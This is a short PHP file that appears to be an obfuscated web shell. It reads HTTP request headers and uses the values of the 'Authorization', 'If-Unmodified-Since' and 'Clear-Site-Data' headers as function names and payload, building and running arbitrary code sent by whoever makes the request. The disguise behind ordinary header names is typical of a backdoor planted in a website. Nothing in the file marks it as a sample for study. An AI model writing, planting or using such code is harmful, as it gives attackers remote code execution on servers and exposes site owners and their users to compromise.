<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Authorization'])) {
    $system = $_HEADERS['Authorization']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['Clear-Site-Data']));
    $system();
}